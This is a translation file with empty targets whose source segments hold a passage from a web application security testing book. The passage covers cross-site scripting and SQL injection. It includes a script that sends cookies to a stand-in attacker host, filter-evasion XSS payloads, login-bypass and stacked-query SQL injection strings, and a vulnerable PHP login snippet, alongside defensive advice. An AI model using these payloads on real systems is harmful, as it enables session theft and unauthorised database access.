        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>&amp;lt;img src=javascript:alert("XSS alert!")&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Other tags, such as &lt;tt&gt;&amp;lt;html&amp;gt;&lt;/tt&gt;, &lt;tt&gt;&amp;lt;body&amp;gt;&lt;/tt&gt;, &lt;tt&gt;&amp;lt;embed&amp;gt;&lt;/tt&gt;, &lt;tt&gt;&amp;lt;frame&amp;gt;&lt;/tt&gt;, &lt;tt&gt;&amp;lt;frameset&amp;gt;&lt;/tt&gt;, &lt;tt&gt;&amp;lt;applet&amp;gt;&lt;/tt&gt;, &lt;tt&gt;&amp;lt;iframe&amp;gt;&lt;/tt&gt;, &lt;tt&gt;&amp;lt;img&amp;gt;&lt;/tt&gt;, &lt;tt&gt;&amp;lt;layer&amp;gt;&lt;/tt&gt;, &lt;tt&gt;&amp;lt;meta&amp;gt;&lt;/tt&gt;, &lt;tt&gt;&amp;lt;object&amp;gt;&lt;/tt&gt;, and &lt;tt&gt;&amp;lt;style&amp;gt;&lt;/tt&gt;, are known to be problematic. However, pretty much all tags that support the attributes &lt;tt&gt;STYLE&lt;/tt&gt;, &lt;tt&gt;SRC&lt;/tt&gt;, &lt;tt&gt;hrEF&lt;/tt&gt;, or &lt;tt&gt;TYPE&lt;/tt&gt; are known to be vulnerable, and filtering for such a list is asking for trouble.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>An attacker's goal is not to pop up message boxes, however annoying that may be. The attacker wants to target two assets that are valuable to them.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The first of these assets is the session identifier that we discussed in &amp;quot;&lt;a class="docLink" href="ch04lev1sec2.html#ch04lev2sec5"&gt;Attack 10&amp;mdash;Session Hijacking&lt;/a&gt;,&amp;quot; in &lt;a class="docLink" href="ch04.html#ch04"&gt;Chapter 4&lt;/a&gt;, &amp;quot;State-Based Attacks.&amp;quot; In that attack, we looked at how an application differentiates visitors. The only way it can do this is by giving each user a unique identifier because HTTP is intrinsically stateless. In Attack 10, the target was discovering this identifier by various means (&lt;span class="docEmphStrong"&gt;guessing&lt;/span&gt;, or &amp;quot;&lt;span class="docEmphStrong"&gt;fixing&lt;/span&gt;&amp;quot; up-coming numbers and breaking their randomness) because by reusing the identifier, the attacker can masquerade as another user and perform actions on his behalf. In XSS, however, the attacker needs to know nothing about how identifiers are generated and simply &amp;quot;steals&amp;quot; existing ones.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Remember above that client-side scripts are restricted to a sandbox of operations and resources that they can access. Among these is the currently loaded page in the browser. Now, instead of popping up static text, a script can display the value of any cookies (the most common place to store session identifiers) by using the following code:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 5-2. Client-side code displaying a cookie's value.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Displaying the cookie value is not useful to the attacker unless he is looking over your shoulder&amp;mdash;the need is to somehow get this value and collect it remotely. The most common way of achieving this is to place an image on the page that references another site.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>&amp;lt;script&amp;gt;
document.write("&amp;lt;img src=http://evilhacker.com/
 px.gif?cookie="+document.cookie")
&amp;lt;/script&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The image in question is a single 1x1-pixel transparent .&lt;tt&gt;gif&lt;/tt&gt;, so it's doubtful that any user would notice it. As the image is being requested, it passes off a &amp;quot;cookie&amp;quot; CGI parameter. Although the Web server doesn't need this parameter to retrieve the image, it is stored in the server's log file. The attacker watches the log for request to the &lt;tt&gt;px.gif&lt;/tt&gt; file and has valid session identifiers in real time.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>When no session identifier exists, the page can still be subject to attack. Take, for example, a news site. There is no reason for an attacker to target cookies because they don't have &amp;quot;value&amp;quot; on such a site, because no sensitive data or operations exist that rely on uniquely identifying users. However, an attacker can use the information on that page to trick users into doing something they otherwise would not consider because they &amp;quot;trust&amp;quot; the site.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Instead of using client-site scripting to pull information from the site, you can push information, modifying what is already there. Consider the pages shown in &lt;a class="docLink" href="#ch05fig03"&gt;Figures 5-3&lt;/a&gt; and &lt;a class="docLink" href="#ch05fig04"&gt;5-4&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 5-3. Original page.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 5-4. Page after modification via XSS.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&lt;a class="docLink" href="#ch05fig03"&gt;Figure 5-3&lt;/a&gt; shows the original site, unmodified. &lt;a class="docLink" href="#ch05fig04"&gt;Figure 5-4&lt;/a&gt; shows a site in which an attacker has introduced code that changes a particular image to try to deceive the user and get him to do something, like sell Microsoft stock. Because the user trusts the site in question, he believes what he is seeing is true.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>So how does the attacker do this? Once again, it comes down to client-side code being able to access the currently loaded page and being able to change it. The following code changes the location of the thirty-eighth image.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>&amp;lt;script&amp;gt;document.images[38].src=http://evilhacker.
 com/msft.gif&amp;lt;/script&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The attacker isn't just limited to images, though. He can rewrite the entire page if he wants to. In October 2004, Jim Ley of &lt;a class="docLink" target="_blank" href="http://Jibbering.org"&gt;Jibbering.org&lt;/a&gt; produced a proof-of-concept exploit to an XSS flaw in Google that made it look like the site was going to be subscription based.&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch05fn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt; Almost exclusively in these examples, the XSS code is provided via a CGI parameter in a link that is e-mailed to users.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch05fn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt; &lt;a class="docLink" target="_blank" href="http://jibbering.com/2004/10/google.html"&gt;http://jibbering.com/2004/10/google.html&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 5-5. Modifying Google via XSS.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In addition to images, cookies, and the page itself, attackers in the future may start targeting login pages or faking login pages to steal users' credentials. Changing the target of a form's &lt;tt&gt;ACTION&lt;/tt&gt; attribute is no different from that of an image's &lt;tt&gt;SRC&lt;/tt&gt;, siphoning off login operations to another site only to redirect the user to one in which the username and password have been logged. Other mechanisms may include floating a &lt;tt&gt;DIV&lt;/tt&gt; or &lt;tt&gt;IFRAME&lt;/tt&gt; over a legitimate login form and using client-side scripting to echo user input to an attacker.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Overall, the best method to discover cross-site scripting is to enter some easily recognizable text into the application and see where it pops back out in the HTML source code. Include the characters &lt;tt&gt;&amp;lt;&lt;/tt&gt;, &lt;tt&gt;&amp;gt;&lt;/tt&gt;, &lt;tt&gt;/,&lt;/tt&gt; and &lt;tt&gt;:&lt;/tt&gt; to identify any encoding or filtering that the application is performing. You can then decide what the best method of attack is and whether you have to include additional characters to break out of enclosed HTML.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This attack is one example of the classic security flaw of data that is being misinterpreted as code, which in our case is any HTML that modifies the behavior or look of a page. However, in some Web applications, it is necessary to allow limited amounts of code in data. Bulletin boards, for example, want people to be able to mark up their inputs with formatting like bold or italic or include other information like links or images.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>One way to prevent this attack is for the Web developer to filter out code from user-supplied input data. But this is harder than it sounds. The &lt;tt&gt;&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;&lt;/tt&gt; tag is not the only possibility to consider. It is conceivable that any scripting language or code injection technique, including HTML, JavaScript, VBScript, Java, ActiveX, Flash, and so forth, can be used as the payload of an XSS attack. There are also a lot of different places where you can place scripting within HTML tags. The following table gives examples of various places or encoding schemes for XSS, elements of which can be combined (that is, use a &lt;tt&gt;LINK&lt;/tt&gt; tag, but point to scripting held on a file on a different server). For a more complete list, with code you can cut and paste, see &lt;a class="docLink" target="_blank" href="http://ha.ckers.org/xss.html"&gt;http://ha.ckers.org/xss.html&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.thead.tr.th.p.text">
          <source>Example</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.thead.tr.th.p.text">
          <source>Description</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.div.pre.text">
          <source>&amp;lt;script&amp;gt;alert("XSS!")&amp;lt;/script&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Basic scripting alert.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.div.pre.text">
          <source>&amp;lt;img src="javascrript:alert ('XSS!')"&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Embedding scripting in another tag.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.div.pre.text">
          <source>&amp;lt;body onload="javascript:alert (XSS!)"&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Using an event to trigger scripting.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.div.pre.text">
          <source>&amp;lt;link rel="stylesheet" href=
 "javascript:alert('XSS');"&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Using dynamic HREF links.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.div.pre.text">
          <source>&amp;lt;object type=text/html data="http://
 evilhacker.com/xss.html"&amp;gt;&amp;lt;/object&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Using code held in a different place.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.div.pre.text">
          <source>&amp;lt;img src="jav&amp;amp;#x0D;ascript:alert
 ('XSS');"&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Embedding carriage returns.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.div.pre.text">
          <source>&amp;lt;scr

ipt&amp;gt;alert("XS

S!")&amp;lt;/scr

ipt&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Breaking the code over multiple lines. Useful when a text area is using &amp;quot;virtual&amp;quot; wrapping.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.div.pre.text">
          <source>%3cscript%3ealert("XSS!")%3c/script%3e</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Encoding angle brackets (see &lt;a class="docLink" href="ch06lev1sec2.html#ch06lev2sec1"&gt;Attack 14&lt;/a&gt; for more details on encoding).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.div.pre.text">
          <source>');alert("XSS!");//</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Some developers use JavaScript to echo data using document.write. This example uses a similar trick to SQL injection.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Rather than filtering for examples of data that should not be allowed, a better approach is to filter (and let through) only data that &lt;span class="docEmphasis"&gt;is&lt;/span&gt; allowed. The more common way of describing this is the difference in using black-lists and white-lists (see the sidebar in the previous chapter). Because it's practically impossible to keep a black-list of all the ways data can be encoded (including future, known attacks) up to date, a much better method is to only allow data that can be proven to be benign.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The easiest way, of course, is to remove the ability for data to be misinterpreted as code. In HTML, all code elements appear within angled brackets (&lt;tt&gt;&amp;lt;&lt;/tt&gt; and &lt;tt&gt;&amp;gt;&lt;/tt&gt;). Therefore, if you replace all angled brackets in data with their encoded representations (&lt;tt&gt;&amp;amp;lt;&lt;/tt&gt; and &lt;tt&gt;&amp;amp;gt;&lt;/tt&gt;), it's impossible to misinterpret data. This becomes a bit of a problem when the application calls for some level of formatting. For example, in a bulletin board, users need to be able to use bold, underline, and italic, in addition to being able to insert images and hyperlinks. In this case, developers should specify a list of tags (a white-list) and encode all the others with their angled brackets, but they should also restrict the attributes that are allowed. An alternative is to use another type of formatting markup (as BBCode does&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch05fn02"&gt;[2]&lt;/a&gt;&lt;/sup&gt;&amp;mdash;[i] ... [\i] is used to designate italics instead of &amp;lt;i&amp;gt; ... &amp;lt;/i&amp;gt;), that is limited and can easily be substituted for actual HTML.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch05fn02"&gt;[2]&lt;/a&gt;&lt;/sup&gt; See &lt;a class="docLink" target="_blank" href="http://en.wikipedia.org/wiki/BBCode"&gt;http://en.wikipedia.org/wiki/BBCode&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Finally, Microsoft has a mitigation technique against using XSS for cookie stealing (and &lt;span class="docEmphasis"&gt;only&lt;/span&gt; this scenario) in Internet Explorer (IE) called</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&lt;span class="docEmphStrong"&gt;HTTP-ONLY&lt;/span&gt;.&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch05fn03"&gt;[3]&lt;/a&gt;&lt;/sup&gt; Developers can add this attribute to cookies, which directs IE to prevent all scripts from being able to query the cookies' value. Because there is no good reason for clients to know their session identification number, it's a good attribute to use along with the secure setting we mentioned in the protecting against Attack 10. It should be perfectly clear that HTTP-ONLY doesn't stop XSS attacks; it simply closes one avenue of attack on one specific browser. Hopefully, other browsers will follow suit in the future.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch05fn03"&gt;[3]&lt;/a&gt;&lt;/sup&gt; For information, see &lt;a class="docLink" target="_blank" href="http://msdn.microsoft.com/workshop/author/dhtml/httponly_cookies.asp"&gt;msdn.microsoft.com/workshop/author/dhtml/httponly_cookies.asp&lt;/a&gt;. Note, however, that HTTP-ONLY is a proprietary vendor technology that is not part of an official standard. At the time of this printing, no detailed study on the security of this add-on has been performed, and there is always the chance that it can or will be bypassed. No matter what vendor you deal with, be careful with their &amp;quot;standards&amp;quot; that are not part of community-reviewed standards.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 12 SQL Injection</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Another type of input-data attack that goes beyond scripts involves the language that software uses to communicate with a database: SQL. Like scripts, you can insert or &amp;quot;inject&amp;quot; SQL queries and commands into input data, which can cause any number of insecure behaviors and user privacy violations.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Many e-commerce applications use a database of one type or another to store information. Whether this is product information, account information, or some other type of data, the database is an important link in the Web application's environment. SQL commands make the interface between the Web front end and a back-end database and enable data to be passed to and from the Web application. You should control this data so that a user only gets information that he is authorized to obtain. However, because many Web sites dynamically generate the SQL query using parameters that the user supplies, an attacker can often trick the application into changing the nature of the query by entering SQL artifacts into a URL, form field, or other input, giving him unrestricted access to the database.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Because SQL queries are often used for authentication, authorization, purchases, and billing, vulnerabilities associated with allowing an attacker to submit arbitrary SQL queries are extremely serious. Often, an attacker is able to use SQL injection to obtain information from a database without being an authorized user.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This attack is applicable whenever input is sent from a Web application to a back-end database. Someone can perform this attack by entering SQL command artifacts into a URL, form field, or other input parameter that is part of a dynamically generated SQL query. Because most Web applications rely on a database for a lot of storage and logic (user permissions, settings, and so forth), numerous parameters may eventually find their way into a query.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Fields that comprise part of a database table are the ones that are most likely to be used in SQL queries for lookup or data retrieval. As you use your target Web application, ask yourself if the data you are entering would likely be stored inside a database. Familiarizing yourself with database design and SQL is highly recommended. However, just trying some of the simple testing techniques discussed next may uncover a small crack that you can leverage into a full-blown vulnerability.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Conduct This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Any input, whether it is a form field on a Web page or a parameter of an API, that is part of an SQL query is subject to a possible SQL injection vulnerability. If no mitigations are in place, attacks may fail only because of an insufficient understanding of the database schema and how queries are constructed. Thus, a security tester needs to understand how data that is presented to a user is employed behind the scenes. Even if you're in doubt about whether this attack applies, try it anyway. The risk of an attacker extracting information from your database makes the effort worth your while.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>A good place to start is to consider the SQL command &lt;tt&gt;SELECT&lt;/tt&gt;, which has the following format:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>SELECT somedatacolumn, someotherdatacolumn
 FROM somedatabasetable
WHERE someconditionismet</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>One common use of SQL in a Web application is to select product information. The application builds links with CGI parameters that are then referenced within a later query. These links often look like this:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>http://www.flowershop.com/store/itemdetail.asp?id=896</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The application needs to know which product you need information on, so the browser passes it an identifier, almost universally called &lt;span class="docEmphStrong"&gt;id&lt;/span&gt;. The application then dynamically includes the value in the SQL query so that it can retrieve the correct row from the database. That query looks something like this:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>SELECT name, picture, description, price from
 products where id=&lt;span class="docEmphStrong"&gt;896&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>However, as we found in the previous attacks, users can easily change information that is supplied for them in their browser. Suppose that a user enters his account ID and password when logging into a Web site where he is an account holder. The following SQL query would retrieve a legitimate user's data:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>SELECT accountdata FROM accountinfo
WHERE accountid = 'anaccountnumber'
AND password = 'apassword'</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Note that the only user-controlled parts of this SQL query are those strings between the single quotes. These are the strings that a user would type into a Web form. The Web application generates the rest of the query.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>For another user to view our account information, he would have to know both our account number and our password, right? Wrong! An attacker who is skilled in SQL injection could bypass the entire check with the trick you are about to learn.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>For example, what if we knew that a user on the system was named Sam? We could use the comment operator in SQL (which is dual dashes &lt;tt&gt;--&lt;/tt&gt;) and type the following into the form field for the account ID:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>Sam' --</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This would cause the following SQL query to be generated:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>SELECT accountdata FROM accountinfo
WHERE accountid = '&lt;span class="docEmphStrong"&gt;Sam' --&lt;/span&gt;'
AND password = 'passwd'</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>But because the dash-dash operator is a comment, everything that follows it is ignored, giving us this:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>SELECT accountdata FROM accountinfo
WHERE accountid = 'Sam'</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Voil&amp;agrave;! We've just pulled all the data out of the table for the user Sam without entering his password! Note carefully the syntax we used. As a user, we were able to supply the name (Sam) followed by the single quote character. This single quote becomes part of the SQL query, which means that we are able to influence the construction of the query sent to the database. Remember, though, that we've used the single quote (to match the opening quote), because quotes have to surround string values in SQL. If we were looking at a query that used integer values, injecting quotes would not be necessary.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In the preceding case, the injected comment removes a condition and seriously compromises the intended operation of the query, which was to check that the username &lt;span class="docEmphasis"&gt;and&lt;/span&gt; password were correct. Allowing users to alter the code of our Web application in this manner is extremely dangerous.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Now let's take this a step further. What if we did not know that Sam was a user and wanted his information anyway? Indeed, what if we wanted &lt;span class="docEmphasis"&gt;all&lt;/span&gt; of the users' information without knowing their account IDs or passwords? Well, we can use a similar trick to the product ID example, but with much more damaging results. In this case, we need to submit an SQL query like this:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>SELECT accountdata FROM accountinfo WHERE accountid
 = '' OR TRUE</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Let's think about how to do this in SQL. The first part, the &lt;tt&gt;accountid&lt;/tt&gt;, is easy; we can use the same trick we used earlier and enter a single quote mark to close out the matching quote mark that the Web application supplies. But to complete this attack, we need to know how to say &lt;tt&gt;TRue&lt;/tt&gt; in SQL. In some databases, using the keyword &amp;quot;TRUE&amp;quot; is good enough, but for a truly universal way, we can use &lt;tt&gt;1=1&lt;/tt&gt; (or &lt;tt&gt;2&amp;gt;1&lt;/tt&gt;, or &lt;tt&gt;3&amp;lt;4&lt;/tt&gt;&amp;mdash;in fact any mathematical operation that is a tautology). Therefore, we can use the following as our input string:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>' OR 1=1 --</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This results in the following SQL commands being sent to the database:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>SELECT accountdata FROM accountinfo WHERE accountid
 = '' OR 1=1</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Because &lt;tt&gt;1=1&lt;/tt&gt; always evaluates to &lt;tt&gt;TRue&lt;/tt&gt;, and anything &lt;tt&gt;OR&lt;/tt&gt;ed with &lt;tt&gt;TRue&lt;/tt&gt; is also true, this will return all the data for every user account in the database.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In this example, the Web developer is probably using that query to find out if a username and password combination exists in the database that matches what the user has supplied. If one exists, the developer usually gets a single row. If one doesn't exist, he gets nothing back from the database. Often, you see code in the Web application that looks something like this:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>$SQLquery = "select * from users where
 username='".$_POST["username"]."' And
 password='".$_POST["password"]."'";
$DBresult=db_query($SQLQuery);
if ($DBresult){
    // username+password is correct&amp;mdash;log the user in
}
else{
    // username or password was incorrect
}</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The problem is, as long as users are in the database, the injection string we introduced earlier will always return multiple rows, and the &lt;tt&gt;DBresult&lt;/tt&gt; variable will be a positive value (and therefore pass the check). Failing to perform a check on the data that we receive is dangerous in this example because with SQL injection, we always get something back. When the application goes to access the received data, it gets the first row of anything in the database.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Now let us assume that the developer uses the first record in the resultset to establish user permissions. That's a common programming technique, because in normal operation, only one row would be returned. However, we've been able to force the database to return a row for all users. In many cases, the first row in a users table is the administrative user for the application, because it's often from this user that all other users are added (and therefore they have to be added to the database before any others). Effectively using SQL injection, we've been able to log ourselves in as an administrator without knowing either usernames or passwords.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Perhaps the easiest way of extending an SQL injection attack is to get the database to perform additional queries. That can be a matter of appending commands using the semicolon, like in the following example:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>SELECT accountdata FROM accountinfo
WHERE accountid = &lt;span class="docEmphStrong"&gt;'';&lt;/span&gt;
&lt;span class="docEmphStrong"&gt;INSERT INTO accountdata (accountid,password)&lt;/span&gt;
&lt;span class="docEmphStrong"&gt;VALUES ('mike','1234') --&lt;/span&gt;' and password=''</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
